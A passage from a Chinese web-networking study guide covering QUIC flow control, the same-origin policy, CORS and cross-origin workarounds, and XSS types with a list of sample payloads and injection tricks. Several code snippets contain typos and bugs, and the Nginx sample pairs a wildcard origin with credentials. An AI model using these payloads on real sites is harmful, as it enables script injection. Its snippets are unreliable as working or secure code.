一般来说，接收方收到发送方的消息后都应该发送一个 ACK 回复，表示收到了数据。但每收到一个数据就返回一个 ACK 回复太麻烦，所以一般不会立即回复，而是接收到多个数据后再回复，TCP SACK 最多提供 3 个 ACK block。但有些场景下，比如下载，只需要服务器返回数据就好，但按照 TCP 的设计，每收到 3 个数据包就要“礼貌性”地返回一个 ACK。而 QUIC 最多可以捎带 256 个 ACK block。在丢包率比较严重的网络下，更多的 ACK block 可以减少重传量，提升网络效率。

#### 2.12.5 流量控制

TCP 会对每个 TCP 连接进行流量控制，流量控制的意思是让发送方不要发送太快，要让接收方来得及接收，不然会导致数据溢出而丢失，TCP 的流量控制主要通过滑动窗口来实现的。可以看出，拥塞控制主要是控制发送方的发送策略，但没有考虑到接收方的接收能力，流量控制是对这部分能力的补齐。

QUIC 只需要建立一条连接，在这条连接上同时传输多条 Stream，好比有一条道路，两头分别有一个仓库，道路中有很多车辆运送物资。QUIC 的流量控制有两个级别：连接级别（Connection Level）和 Stream 级别（Stream Level），好比既要控制这条路的总流量，不要一下子很多车辆涌进来，货物来不及处理，也不能一个车辆一下子运送很多货物，这样货物也来不及处理。

那 QUIC 是怎么实现流量控制的呢？我们先看单条 Stream 的流量控制。Stream 还没传输数据时，接收窗口（flow control receive window）就是最大接收窗口（flow control receive window），随着接收方接收到数据后，接收窗口不断缩小。在接收到的数据中，有的数据已被处理，而有的数据还没来得及被处理。如下图所示，蓝色块表示已处理数据，黄色块表示未处理数据，这部分数据的到来，使得 Stream 的接收窗口缩小。

随着数据不断被处理，接收方就有能力处理更多数据。当满足 (flow control receive offset - consumed bytes) < (max receive window / 2) 时，接收方会发送 WINDOW_UPDATE frame 告诉发送方你可以再多发送些数据过来。这时 flow control receive offset 就会偏移，接收窗口增大，发送方可以发送更多数据到接收方。

Stream 级别对防止接收端接收过多数据作用有限，更需要借助 Connection 级别的流量控制。理解了 Stream 流量那么也很好理解 Connection 流控。Stream 中，接收窗口(flow control receive window) = 最大接收窗口(max receive window) - 已接收数据(highest received byte offset) ，而对 Connection 来说：接收窗口 = Stream1 接收窗口 + Stream2 接收窗口 + ... + StreamN 接收窗口 。

## 第三章、网络安全

### 3.1 同源策略

同源策略限制从一个源加载的文档或脚本如何与来自另一个源的资源进行交互，这是一个用于隔离潜在恶意文件的关键的安全机制。

同源需要满足以下三个方面：

- 协议相同
- 域名相同
- 端口相同

如果是非同源，则以下行为会受到限制：

- Cookie、LocalStorage 和 IndexDB 无法读取
- DOM 无法获取
- AJAX 请求不能发送

**为什么要实现跨域请求？**

工程服务化后，不同职责的服务分散在不同的工程中，往往这些工程的域名是不同的，但一个需求可能对应到多个服务，这时便需要调用不同服务的接口，因此会出现跨域。

同源策略仅存在于浏览器客户端，不存在 Android、iOS、NodeJS、Python、Java 等其他环境。

#### 3.1.1 跨源网络访问

严格来说，浏览器并不是拒绝所有的跨域请求，实际上拒绝的是跨域的读操作。

同源策略控制了不同源之间的交互，这些交互通常分为三类：

-  通常浏览器允许进行跨域 **写操作**（Cross-origin writes），如链接、重定向以及表单提交
- 通常浏览器允许跨域 **资源嵌入**（Cross-origin embedding），如 `img`、`script` 标签
-  通常浏览器不允许跨域 **读操作**（Cross-origin reads），但常可以通过内嵌资源来巧妙地进行读取访问。例如可以读取嵌套图片的高度和宽度，调用内嵌脚本的方法

#### 3.1.2 cors

CORS 亦即跨域资源共享，是一种 HTTP 机制，它使用额外的 HTTP 响应头来告诉浏览器让其运行在一个 `origin` (`domain`) 上的 Web 应用被准许访问来自 **不同源服务器** 上的指定的资源。当一个资源从与该资源本身所在的服务器 **不同的域、协议或端口** 请求一个资源时，资源会发起一个 **跨域 HTTP 请求**。

值得注意的是，通常使用 CORS 时，异步请求会被分为**简单请求**和**非简单请求**，非简单请求的区别是会先发送一个 **预检请求**（Preflight Request）。

| 响应头                             | 描述                                                         |
| ---------------------------------- | ------------------------------------------------------------ |
| `Access-Control-Allow-Headers`     | 请求头，响应头，预请求（携带 Cookie 情况下不能为 `*`）       |
| `Access-Control-Allow-Methods`     | 请求头，响应头，预请求（携带 Cookie 情况下不能为 `*`）       |
| `Access-Control-Allow-Origin`      | 响应头，预请求 / 正常请求（携带 Cookie 情况下不能为 `*`）    |
| `Access-Control-Allow-Credentials` | 响应头，预请求/正常请求（携带 Cookie 情况下要设置为 `true`） |
| `Access-Control-Max-Age`           | 响应头，预请求（单位 `s`）                                   |

`Access-Control-Allow-Origin` 只能阻止浏览器端拿到服务器返回数据，服务端的处理还是会执行，要配合 `token` 鉴权令牌等策略来防范。

##### 3.1.2.1 原生实现

在 Node.js 中 `CORS` 的实现：

```js
app.use(async (ctx, next) => {
  ctx.set('Access-Control-Allow-Origin', ctx.headers.origin);
  ctx.set('Access-Control-Allow-Credentials', true);
  ctx.set('Access-Control-Request-Method', 'PUT,POST,GET,DELETE,OPTIONS');
  ctx.set('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, cc');
});
```

##### 3.1.2.2 第三方中间件

```js
const Koa = require('koa');
const cors = require('koa2-cors'); // 使用插件解决跨域处理

const app = new Koa();

app.use(
  cors({
    origin: function (ctx) {
      if (ctx.url === '/login') {
        // 允许来自所有域名的请求
        return '*';
      }

      // 只允许 http://localhost:8080 这个域名的请求
      return 'http://localhost:8080';
    },
    // 指定本次预检请求的有效期，单位为秒
    maxAge: 5,
    // 是否允许发送 Cookie
    credentials: true,
    // 设置所允许的 HTTP 请求方法
    allowMethods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    // 设置服务器支持的所有头信息字段
    allowHeaders: ['Content-Type', 'Authorization', 'Accept'],
    // 设置获取其他自定义字段
    exposeHeaders: ['WWW-Authenticate', 'Server-Authorization'],
  })
);
```

##### 3.1.2.3 关于 Cookie 问题

要传递 Cookie 需要满足三个条件：

1. Web 请求设置 `withCredentials`

这里默认情况下在跨域请求，浏览器是不带 Cookie 的。但是我们可以通过设置 `withCredentials` 来进行传递 Cookie。

```js
// 原生 XMLHttpRequest 的设置方式const xhr = new XHRHttpRequest();xhr.withCredentials = true;
// Axios 设置方式axios.default.withCredentials = true;
```

1. `Access-Control-Allow-Credentials` 为 `true`
2. `Access-Control-Allow-Origin` 为非 `*`

这里的请求方式，在 Chrome 中是能看到返回值的，但是只要不满足以上其一，浏览器会报错，无法获取数据。

#### 3.1.3 Node 代理

利用 Node + Express + Http-Proxy-Middleware 搭建一个 Proxy 服务器。

前端代码

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    hello proxy
    <script>
        const xhr = new XMLHttpRequest();
        // 前端开关：浏览器是否读写cookie
        xhr.withCredentials = true;
        // 访问http-proxy-middleware代理服务器
        xhr.open('get','http://localhost:8081/login?user=admin',true);
        xhr.send()
    </script>
</body>
</html>
```

代理服务器代码

```js
const express = require('express');
const { createProxyMiddleware} = require('http-proxy-middleware');
const app = express();

app.use('/',createProxyMiddleware({
    // 代理跨域目标接口
    target:'http://localhost:8888',
    changeOrigin: true,
    // 修改响应头信息，实现跨域并允许带cookie
    onProxyRes:function(proxyRes, req, res){
        res.header('Access-Control-Allow-Origin', 'http://localhost:8000');
        res.header('Access-Control-Allow-Credentials', 'true');
    },

    // 修改响应信息中的cookie域名
    cookieDomainRewrite: 'localhost:8000', // 可以为false，表示不修改
}))

app.use('/login',function(req,res){
    console.log(req);
    res.send('hello')
})
app.listen(8081);
```

目标服务器

```js
const http = require('http')
const server = http.createServer((req,res)=>{
    if(req.url.indexOf('/login') === 0){
       console.log(req.url);
    }
    res.end('hello')
})


server.listen(8888,()=>{
    console.log('http://localhost:8888');
})
```

#### 3.1.4 Nginx 反向代理

Nginx 可实现用于反向代理的异步 Web 服务器，他除了用于反向代理以外还可以用于负载均衡、 HTTP 缓存。

```nginx
http {
  include               mime.types;
  default_type          application/octet-stream;
  client_max_body_size  2000M;
  keepalive_timeout     65;

  # 虚拟服务器
  server {
    listen       8080;
    server_name  localhost;

    # CORS 设置
    # 指定响应资源是否允许与给定的 origin 共享
    add_header Access-Control-Allow-Origin *;
    # 配置是否允许将对请求的响应暴露给页面
    add_header Access-Control-Allow-Credentials 'true';
    # 配置允许跨域的请求头
    add_header Access-Control-Allow-Headers 'Authorization,Content-Type,Accept,Origin,User-Agent,Cache-Control,X-Mx-ReqToken,X-Requested-With';
    # 配置允许跨域的请求方法
    add_header Access-Control-Allow-Methods 'GET,POST,Options';

    # 跳过服务端校验，直接返回 200
    if ($request_method = 'OPTIONS') {
      return 200;
    }

    location / {
        root        /data/example/dist;
        index       index.html index.htm;
        try_files   $uri /index.html;
        add_header  Cache-Control "private, no-store, no-cache, must-revalidate, proxy-revalidate";
    }

    location /api/ {
        proxy_pass  https://xxx.xxx.xxx/req/;
    }
  }
}
```

- 对于简单请求，如 GET，只需要在 HTTP Response 后添加 Access-Control-Allow-Origin
- 对于非简单请求，如 POST、PUT、DELETE 等，浏览器会分两次应答。第一次 Preflight（`method: OPTIONS`），主要验证来源是否合法，并返回允许的 `Headers` 等；第二次才是真正的 HTTP 应答，所以服务器必须处理 `OPTIONS` 应答。

由于浏览器第一次 Preflight 预检，导致服务端对其请求进行校验，但是服务端本身没有开启 CORS，所以会导致服务端返回 405 Method Not Allowed 或者 403 Forbidden。所以我们需要在 Nginx 对该请求进行拦截，直接返回 200，跳过服务端校验。

#### 3.1.5 JSONP

动态创建 `<script>` 脚本标签，通过跨域脚本嵌入不受同源策略限制的方法实现请求第三方服务器数据内容。除了适用于 `<script>` 脚本标签，HTML 中包含 `src` 和 `href` 属性的标签均不受同源策略限制。

1. 动态创建 `<script>` 标签
2. 标签 `src` 属性设置接口地址
3. 接口参数，必须要带一个自定义函数名，要不然后台无法返回数据，通常为 `callback` 或 `cb`
4. 通过定义函数名去接收后台返回数据

前端代码：

```js
// 动态创建脚本标签
const script = document.createElement('script');

// 设置接口地址
script.src = 'http://localhost:8080/api/jsonp?cb=jsonpCallback';

// 插入页面
document.appendChild(script);

// 通过定义回调函数接收响应数据
window.jsonpCallback = function (res) {
  // do something with response data
};
```

后端代码：

```js
const Koa = require('koa');
const fs = require('fs');
const app = new Koa();

app.use(async (ctx, next) => {
  if (ctx.path === '/api/jsonp') {
    const { cb } = ctx.query;
    ctx.body = `${cb}(${JSON.stringify({ msg })})`;
    return;
  }
});

app.listen(8080);
```

由于 `<script>` 元素请求的脚本，直接作为代码运行。这时，只要浏览器定义了回调函数，该函数就会立即调用。作为参数的 JSON 数据被视为 JavaScript 对象，而不是字符串，因此避免了使用 `JSON.parse` 的步骤。

**缺点**：

- 非常高的跨站脚本攻击风险
- 只能实现 GET 请求
- 接口出现错误时，很难进行错误识别处理

#### 3.1.6 WebSocket

WebSocket 是一种通信协议，使用 `ws://`（非加密）和 `wss://`（加密）作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。

简单来说，WebSocket 通过客户端和服务端之间建立持久的连接，双方可以随时发送数据。

这种方式本质上没有使用 HTTP 协议进行通信，因此也没有浏览器跨域的限制。

前端代码：

```js
const socket = new WebSocket('ws://localhost:8080');

socket.onopen = function () {
  socket.send('Client Socket is openning');
};

socket.onmessage = function (e) {
  console.log(e.data);
};
```

后端代码：

```js
const WebSocket = require('ws');
const server = new WebSocket.Server({ port: 8080 });

server.on('connection', function (socket) {
  socket.on('message', function (data) {
    socket.send(data);
  });
});
```

#### 3.1.7  window.postMessage

通常，对于两个不同页面的脚本，只有当执行它们的页面位于具有相同的协议（通常为 HTTPS），端口号（443 为 HTTPS 的默认值），以及主机（两个页面的模数 `document.domain` 设置为相同的值）时，这两个脚本才能相互通信。`window.postMessage` 方法提供了一种受控机制来规避此限制，只要正确的使用，这种方法就很安全。

**用途：**

1. 页面和其打开的新窗口的数据传递
2. 多窗口之间消息传递
3. 页面与嵌套的 iframe 消息传递

```js
otherWindow.postMessage(message, targetOrigin, [transfer]);
```

- `otherWindow`：其他窗口的一个引用，比如 iframe 的 `contentWindow` 属性、执行 `window.open` 返回的窗口、或者是命名过或数值索引的 `window.iframes`
- `message`：将要发送到其他 `window` 的数据
- `targetOrigin`：通过窗口的 `origin` 属性来指定哪些窗口能接收到消息事件
- `transfer`（可选）：是一串和 `message` 同时传递的 Transferable 对象，这些对象的所有权将被转移给消息的接收方，而发送一方将不再保有所有权

发送端页面：

```html
<iframe id="iframe" src="http://localhost:8080/" frameborder="0" onload="load()"></iframe>

<script type="application/javascript">
  function load() {
    iframe.contentWindow.postMessage('Hello world!', 'http://localhost:8080/');

    window.onmessage = (e) => {
      console.log(e.data);
    };
  }
</script>
```

接收端页面：

```html
<script type="application/javascript">
  window.onmessage = (e) => {
    console.log(e.data);
    // Hello world!
    e.source.postMessage(e.data, e.origin);
  };
</script>
```

#### 3.1.8 document.domain + iframe

Cookie 是服务器写入浏览器的一小段信息，只有同源的网页才能共享。

但是，两个网页一级域名相同，只是二级域名不同，浏览器只需要设置 `document.domain` 为更高级别的域就能实现 Cookie 共享。

------

以 `a.foo.com` 和 `b.foo.com` 为例，只要设置相同的 `document.domain`，两个网页就可以共享 Cookie。

```
document.domain = 'foo.com';
```

**注意**：这种方法只适用于 Cookie 和 iframe 窗口，localStorage 和 IndexDB 无法通过这种方法，规避同源策略，需要采用下文提及的 [PostMessage API](https://tsejx.github.io/javascript-guidebook/computer-networks/web-security/same-origin-policy#postMessage)。

另外，服务器也可以在设置 Cookie 的时候，指定 Cookie 的所属域名为一级域名。

```
Set-Cookie: key=value; domain=.example; path=/
```

那么，二级域名和三级域名不用做任何设置，都可以读取这个 Cookie。

#### 3.1.9 window.location.hash + iframe

如果两个网页不同源，就无法拿到对方的 DOM。典型的例子是 `iframe` 窗口和 `window.open` 方法打开的窗口，它们与父窗口无法通信。

通过 `url` 带 `hash` 锚点，可以通过一个非跨域的中间页面来传递数据。

一开始 `a.html` 给 `c.html` 传一个 hash 值，然后 `c.html` 收到 hash 值后，再把 hash 值传递给 `b.html`，最后 `b.html` 将结果放到 `a.html` 的 hash 值中。同样的，`a.html` 和 `b.html` 是同域的，都是 `http://localhost:8000/`，而 `c.html` 是 `http://localhost:8080/`。

`a.html`：

```html
<iframe src="http://localhost:8080/hash/c.html#param1"></iframe>
<script type="application/javascript">  console.log(location.hash);
  window.onhashchange = function () {    console.log(location.hash);  };</script>
```

`b.html`：

```html
<script type="application/javascript">
  window.parent.parent.location.hash = location.hash;
</script>
```

`c.html`：

```html
<body></body><script type="application/javascript">  console.log(location.hash);
  const iframe = document.createElement('iframe');
  iframe.src = 'http://localhost:8000/hash/b.html#name2';
  document.body.appendChild(iframe);</script>
```

#### 3.1.10 window.name + iframe

`window` 对象的 `name` 属性是一个很特别的属性，当该 `window` 的 `location` 变化，然后重新加载，它的 `name` 属性可以依然保持不变。

其中 `a.html` 和 `b.html` 是同域的，都是 `http://localhost:8000/`，而 `c.html` 是 `http://localhost:8080/`。

`a.html`：

```html
<iframe  id="iframe"  frameborder="0"  src="http://localhost:8080/name/c.html"  onload="load()"></iframe>
<script type="application/javascript">  let first = true;  // onload 事件会触发 2 次，第 1 次加载跨域页，并留存数据于 window.name  function load() {    if (first) {      // 第 1 次 onload（跨域页）成功后，切换到同域代理页面      iframe.src = 'http://localhost:8000/name/b.html';      first = false;    } else {      // 第 2 次 onload（同域 b.html 页）成功后，读取同域 window.name 中数据      console.log(iframe.contentWindow.name);    }  }</script>
```

`b.html` 为中间代理页，与 `a.html` 同域，内容为空。

```html
<div></div>
```

`c.html`：

```html
<script type="application/javascript">
  window.name = 'Hello world!';
</script>
```

#### 3.1.11 阻止跨源访问

- 阻止跨域写操作，只要检测请求中的一个不可测的标记（CSRF token）即可，这个标记被称为CSRF 标记。必须使用这个标记来阻止页面的跨站读操作。
- 阻止跨站嵌入，需要确保你的资源不能是以上列出的可嵌入资源格式。多数情况下浏览器都不会遵守 `Content-Type` 消息头。例如，如果您在 HTML 文档中指定 `<script>` 标记，则浏览器将尝试将 HTML 解析为 JavaScript。 当您的资源不是您网站的入口点时，您还可以使用 CSRF 令牌来防止嵌入。
- 阻止资源的跨站读取，需要保证该资源是不可嵌入的。阻止嵌入行为是必须的，因为嵌入资源通常向其暴露信息。

### 3.2 XSS 跨站脚本攻击

XSS 攻击全称 **跨站脚本攻击**（Cross-Site Scripting），是一种代码注入攻击。

- 攻击方法：攻击者利用网页开发时留下的漏洞，通过巧妙的方法在目标网站 HTML 页面中注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。
- 本质：恶意代码未经过滤，与网站正常的代码混在一起；浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行。

#### 3.2.1 攻击种类

根据攻击的来源，XSS 攻击可分为 **反射型**、**存储型** 和 **DOM-Based 型**三种。

| 类型         | 存储区                          | 插入点          |
| ------------ | ------------------------------- | --------------- |
| 反射型       | URL                             | HTML            |
| 存储型       | 服务端数据库                    | HTML            |
| DOM-Based 型 | 服务端数据库 / 客户端存储 / URL | 前端 JavaScript |

> 名词说明：
>
> - **存储区**：恶意代码存放的位置
> - **插入点**：由谁取得恶意代码，并插入到网页上

##### 3.2.1.1 反射型

反射型 XSS 攻击又称为**非持久性跨站点脚本攻击**，这种攻击类型通过诱导用户点击恶意链接来造成一次性攻击。

**攻击方式**：漏洞产生的原因是攻击者 **注入的数据反映在请求响应** 中。用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户浏览器执行，从而达到攻击目的。通过 URL 参数直接注入，然后在响应的数据中包含着危险的代码。

攻击步骤：

1. 攻击者把带有恶意脚本代码参数的 URL 地址发送给用户
2. 用户点击此链接
3. 服务器端获取请求参数并且直接使用，服务器反射回结果页面

说明：

- 反射型 XSS 攻击是一次性的，必须要通过用户点击链接才能发起
- 一些浏览器如 Chrome 其内置了一些 XSS 过滤器，可以防止大部分反射型 XSS 攻击
- 反射型 XSS 其实就是服务器没有对恶意的用户输入进行安全处理就直接反射响应内容，导致恶意代码在浏览器中执行的一种 XSS 漏洞

攻击示例：

```html
<div id="root"></div>

<script type="application/javascript">
  // 假设这是请求返回的数据
  const res = ['1', '2', '3', '<img src="1" onerror="console.log(windwo.localStorage)" />'];

  const root = document.querySelector('#root');

  res.forEach((item) => {
    const p = document.createElement('p');
    p.innerHTML = item;
    root.append(p);
  });
</script>
```

当数据返回后，`<img>` 标签会注入 HTML DOM 文档中，又因为 `src` 属性为无效的 URL 值，所以触发了 `onerror` 事件，从而执行了 `onerror` 定义的函数，这样便获取到了存储在客户端本地的 `localStorage` 信息。

> **反射型 XSS 跟存储型 XSS 的区别是？**
>
> - 反射型 XSS 漏洞常见于 **通过 URL 传递参数** 的功能，如网站搜索、跳转等。
> - 存储型 XSS 的恶意代码 **存在数据库** 里，反射型 XSS 的恶意代码存在 URL 里。
>
> 由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。

POST 的内容也可以触发反射型 XSS，只不过其触发条件比较苛刻（需要构造表单提交页面，并引导用户点击），所以非常少见。

##### 3.2.1.2 存储型

存储型 XSS 攻击又称为**持久性跨站点脚本攻击**，通常攻击者将代码存储到漏洞服务器中，用户浏览相关页面发起攻击。

攻击步骤：

1. 攻击者将恶意脚本代码上传或存储到漏洞服务器
2. 服务器把恶意脚本保存到服务器
3. 当正常客户访问服务器时，服务器会读取恶意数据并且直接使用
4. 服务器会返回含有恶意脚本的页面

实际案例：

- 譬如发帖中发出包含恶意代码的内容，其他内容访问到该内容后，满足特定条件后条件即触发
- 需要后台不过滤信息，并且前端展示时也不过滤信息

**注意**：这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。

修复：服务端一般不会轻易对大量已存数据再编辑。需要对新写入数据修正存储逻辑。前端做好正确的 **编码转义**。

| 类型     | 反射型       | 存储型                   |
| -------- | ------------ | ------------------------ |
| 持久性   | 非持久       | 持久化（存储在服务器）   |
| 触发时机 | 需要用户点击 | 不需要用户交互也可以触发 |
| 危害     | 危害较小     | 危害更大                 |

##### 3.2.1.3 DOM Based 型

DOM Based 型 XSS，这种攻击类型不需要服务器端支持，是由于 DOM 结构修改导致的，基于浏览器 DOM 解析的攻击

攻击步骤：

1. 用户打开带有恶意的链接
2. 浏览器在 DOM 解析的时候直接使用恶意数据
3. 用户中招
4. 常见的触发场景就是在修改 `innerHTML`、`outerHTML`、`document.write` 的时候

实际案例：

- 譬如 Wifi 浏览器劫持、DNS 劫持，并直接返回钓鱼页面
- 本质是需要更改 DOM，再排除自己攻击自己，所以这里单独拿流量劫持举例。严格来说某些反射型的攻击也能造成这个后果-通过 URL 控制 DOM。

DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。

#### 3.2.2 攻击手段

- 获取页面的数据，如 DOM、Cookie、LocalStorage
- 破坏页面结构
- 流量劫持
- 挂马
- 盗取用户 Cookie
- DDOS（拒绝服务）客户端浏览器
- 钓鱼工具，高级的钓鱼技巧
- 删除用户文章、恶意篡改数据、嫁祸
- 劫持用户 Web 行为，甚至进一步渗透内网
- 爆发 Web2.0 蠕虫
- 蠕虫式 DDoS 攻击
- 蠕虫式挂马攻击、刷广告、刷流量、破坏网上数据

常见有效荷载（Payload）：

```html
<input onfocus=write('xss') autofocus>
<img src onerror=alert('xss')>
<svg onload=alert('xss') >
<script>alert('xss')</script>
<a href="javascript:alert('xss')">clickme</a>
```

> XSS 荷载（XSS Payload）是指恶意植入且具有完成各种具体功能的恶意脚本。

##### 3.2.2.1 标签拼接漏洞

服务端渲染代码：这里的 `input` 可能是客户端传递到服务端的数据

```js
// Server Code
function serverRender(input) {
  return '<div>' + input + '</div'>
}
```

攻击方法：破坏原来的 HTML 代码结构，让你写的代码生效

输入渲染的 `input` 变量为 `<script>alert(1)</script>`

输出渲染的 HTML 结构：`<div><script>alert(1)</script></div>`

这样你脚本内的 `alert(1)` 函数返回到前端渲染时就会被自动执行。

##### 3.2.2.2 提前闭合标签

对于 `<textarea>` 这种原生会转换输入数据为字符串的标签，可以输入提前闭合标签绕过：

```html
</textarea<script>alert(1)</script><textarea>
```

或者 `input`标签：

```js
// Server Code
function serverRender(input) {
  return '<input type="name" value=' + input + '">';
}
```

输入 `input` 变量：`"><script>alert(1)</script>`

输出渲染的 HTML 结构：`<input type="name" value=""><script>alert(1)">`

##### 3.2.2.3 合法 HTML 转义漏洞

服务端渲染代码：将用户输入代码通过合法的 HTML 标签转义输出，返回给前端渲染

```js
// Server Code
function serverRender(input) {
  // HTML 的字符转义
  function escapeHtml(s) {
    return s
      .replace(/&/g, '&amp;')
      .replace(/'/g, '&#39;')
      .replace(/"/g, '&quot;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&rt;')
      .replace(/\//g, '&#x2f');
  }

  const domainReg = /^https?:\/\/www\.example\.com/;

  if (domainRe.test(input)) {
    return `<script src="${escapeHtml(input)}"></script>`;
  }

  return 'Invalid URL';
}
```

攻击方法：创建多级域名，子孙级域名中带 `.com`

```js
// 输入
const input = 'https://www.example.com.xss.com/foo.js';
```

HTML 转码在 URL 和 JavaScript 中都是无效的。

##### 3.2.2.4 合法 JS 转义漏洞

```js
// Server Code
function serverRender(s) {
  // JavaScript 的字符转义
  function escapeJs(s) {
    return s
      .replace(/\\/g, '\\\\')
      .replace(/'/g, "\\'")
      .replace(/"/g, '\\"')
      .replace(/`/g, '\\`')
      .replace(/</g, '\\74')
      .replace(/>/g, '\\76')
      .replace(/\//g, '\\/')
      .replace(/\n/g, '\\n')
      .replace(/\r/g, '\\r')
      .replace(/\t/g, '\\t')
      .replace(/\f/g, '\\f')
      .replace(/\v/g, '\\v')
      .replace(/\0/g, '\\0');
  }

  const s = escapeJs(s);

  return `
<script type="application/javascript">
  var url = 'javascript:console.log("${s}")'
  var a = document.createElement('a')

  a.href = url
  document.body.appendChild(a)
  a.click()
</script>
  `;
}
```

输出的 HTML DOM 结构：

```html
<script type="application/javascript">
  var url = 'javascript:console.log("")';
  var a = document.createElement('a');

  a.href = url;
  document.body.appendChild(a);
  a.click();
</script>
```

##### 3.2.2.5  方法总结

- 在 HTML 中内嵌的文本那种，恶意内容以 `script` 标签形成注入
- 在内联的 JavaScript 中，拼接的数据突破了原本的限制（字符串、变量、方法名等）
- 在标签属性中，恶意内容包含引号，从而突破属性值的限制，注入其他属性或者标签
- 在标签的 `href`、`src` 等属性中，包含 `javascript:` 等可执行代码
- 在 `onload`、`onerror`、`onclick` 等事件中，注入不受控制代码
- 在 `style` 属性和标签汇总，包含类似 `background-image: url("javascript:...")` 的代码（新版本浏览器已经可以防范）
- 在 `style` 属性和标签中，包含类似 `expression(...)` 的 CSS 表达式代码（新版本浏览器已经可以防范）

#### 3.2.3 防御策略

- 未雨绸缪
  - HTML 正文：HTML 实体字符转义
  - HTML 标签：HTML 实体字符转义
  - HTML `onxxx` 事件属性：JS 转义
  - URL：URL 转义
  - 用户富文本输入：后端白名单标签过滤，使用开源库（例如：[sanitize-html](https://www.npmjs.com/package/sanitize-html)），不要用正则过滤
- 配置安全协议头
  - Content-Security-Policy

##### 3.2.3.1 输入过滤

在用户提交时，由前端过滤输入，然后提交到后端。这样做是否可行呢？

答案是不可行。一旦攻击者绕过前端过滤，直接构造请求，就可以提交恶意代码了。

那么，换一个过滤时机：后端在写入数据库前，对输入进行过滤，然后把 **安全的** 内容，返回给前端。这样是否可行呢？

我们举一个例子，一个正常的用户输入了 `5 < 7` 这个内容，在写入数据库前，被转义，变成了 `5 < 7`。

问题是：在提交阶段，我们并不确定内容要输出到哪里。

这里的 **并不确定内容要输出到哪里** 有两层含义：

- 用户的输入内容可能同时提供给 Web 前端和客户端，而一旦经过了 `escapeHTML()`，客户端显示的内容就变成了乱码 `5 < 7`。
- 在前端中，不同的位置所需的编码也不同。

当 `5 < 7` 作为 HTML 拼接页面时，可以正常显示：

```html
<div title="comment">5 &lt; 7</div>
```

当 `5 < 7` 通过 AJAX 返回，然后赋值给 JavaScript 的变量时，前端得到的字符串就是转义后的字符。这个内容不能直接用于 Vue 等模板的展示，也不能直接用于内容长度计算。不能用于标题、`alert` 等。

所以，输入侧过滤能够在某些情况下解决特定的 XSS 问题，但会引入很大的不确定性和乱码问题。在防范 XSS 攻击时应避免此类方法。 当然，对于明确的输入类型，例如数字、URL、电话号码、邮件地址等等内容，进行输入过滤还是必要的。

输入侧过滤能够在某些情况下解决特定的 XSS 问题，但会引入很大的不确定性和乱码问题。在防范 XSS 攻击时应避免此类方法。

##### 3.2.3.2 纯前端渲染

预防攻击类型：`存储型 XSS` 和 `反射型 XSS`。

纯前端渲染的过程：

1. 浏览器先加载一个静态 HTML，此 HTML 中不包含任何跟业务相关的数据。
2. 然后浏览器执行 HTML 中的 JavaScript。
3. JavaScript 通过 AJAX 加载业务数据，调用 DOM API 更新到页面上。

在纯前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本 `.innerText`，还是属性 `.setAttribute`，还是样式 `.style` 等等。如此，浏览器不会被轻易地被欺骗，执行预期外的代码。

但纯前端渲染还需注意避免 DOM 型 XSS 漏洞，例如 `onload` 事件和 `href` 中的 `javascript:xxx` 等。

在很多内部、管理系统中，采用纯前端渲染是非常合适的。但对于性能要求高，或有 SEO 需求的页面，我们仍然要面对拼接 HTML 的问题。

##### 3.2.3.3 转义 HTML

如果拼接 HTML 是必要的，就需要采用合适的转义库，对 HTML 模板各处插入点进行充分的转义。 常用的模板引擎，如 `doT.js`、`ejs`、`FreeMarker` 等，对于 HTML 转义通常只有一个规则，就是把 `& < > " ' /` 这几个字符转义掉，确实能起到一定的 XSS 防护作用，但并不完善：

| XSS 安全漏洞      | 简单转义是否有防护作用 |
| ----------------- | ---------------------- |
| HTML 标签文字内容 | 有                     |
| HTML 属性值       | 有                     |
| CSS 内联样式      | 无                     |
| 内联 JavaScript   | 无                     |
| 内联 JSON         | 无                     |
| 跳转链接          | 无                     |

所以要完善 XSS 防护措施，我们要使用更完善更细致的转义策略。

例如 Java 工程里，常用的转义库 `org.owasp.encoder`。

```html
<!-- HTML 标签内文字内容 -->
<div><%= Encode.forHtml(UNTRUSTED) %></div>

<!-- HTML 标签属性值 -->
<input value="<%= Encode.forHtml(UNTRUSTED) %>" />

<!-- CSS 属性值 -->
<div style="width:<= Encode.forCssString(UNTRUSTED) %>"></div>

<!-- CSS URL -->
<div style="background:<= Encode.forCssUrl(UNTRUSTED) %>"></div>

<!-- JavaScript 内联代码块 -->
<script type="application/javascript">
  var msg = '<%= Encode.forJavaScript(UNTRUSTED) %>';
  alert(msg);
</script>

<!-- JavaScript 内联代码块内嵌 JSON -->
<script type="application/javascript">
  var __INITIAL_STATE__ = JSON.parse('<%= Encoder.forJavaScript(data.to_json) %>');
</script>

<!-- HTML 标签内联监听器 -->
<button onclick="alert('<%= Encode.forJavaScript(UNTRUSTED) %>');">
  click me
</button>

<!-- URL 参数 -->
<a href="/search?value=<%= Encode.forUriComponent(UNTRUSTED) %>&order=1#top"></a>

<!-- URL 路径 -->
<a href="/page/<%= Encode.forUriComponent(UNTRUSTED) %>"></a>
<!--
  URL.
  注意：要根据项目情况进行过滤，禁止掉 "javascript:" 链接、非法 Scheme 等
-->
<a
  href='<%=
    urlValidator.isValid(UNTRUSTED) ?
      Encode.forHtml(UNTRUSTED) :
    "/404"
  %>'
>
  link
</a>
```

##### 3.2.3.4 禁止执行不可信数据

